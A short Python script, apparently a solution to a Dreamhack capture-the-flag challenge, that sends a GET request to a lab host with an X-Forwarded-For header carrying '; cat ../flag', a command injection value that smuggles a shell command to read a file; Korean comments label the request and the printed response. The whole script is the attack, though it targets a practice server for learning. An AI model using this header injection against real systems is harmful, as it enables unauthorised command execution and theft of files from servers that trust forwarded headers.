import requests

url = "http://host3.dreamhack.games:18057/"
headers = {
    "X-Forwarded-For": "; cat ../flag" 
}

# GET 요청 보내기
response = requests.get(url, headers=headers)

# 응답 출력
print(response.text)
